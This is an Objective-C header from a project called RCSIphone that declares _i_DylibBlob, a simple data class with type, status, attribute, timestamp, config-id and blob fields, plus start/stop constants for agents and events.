//
//  RCSIDylibBlob.h
//  RCSIphone
//
//  Created by kiodo on 11/05/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#define DYLIB_AGENT_STOP_ATTRIB  0x00000000
#define DYLIB_AGENT_START_ATTRIB 0x00000001

#define DYLIB_EVENT_STOP_ATTRIB  0x00000000
#define DYLIB_EVENT_START_ATTRIB 0x00000001

@interface _i_DylibBlob : NSObject
{
  uint    type;
  uint    status;
  uint    attributes;
  time_t  timestamp;
  time_t  configId;
  NSData *blob;
}

@property (readwrite) uint type;
@property (readwrite) uint status;
@property (readwrite) uint attributes;
@property (readwrite, retain) NSData *blob;
@property (readwrite) time_t  timestamp;
@property (readwrite) time_t  configId;

- (id)initWithType:(uint)aType
            status:(uint)aStatus
        attributes:(uint)aAttributes
              blob:(NSData*)aBlob
          configId:(time_t)aId;

- (uint)getAttribute:(uint)aAttrib;

@end
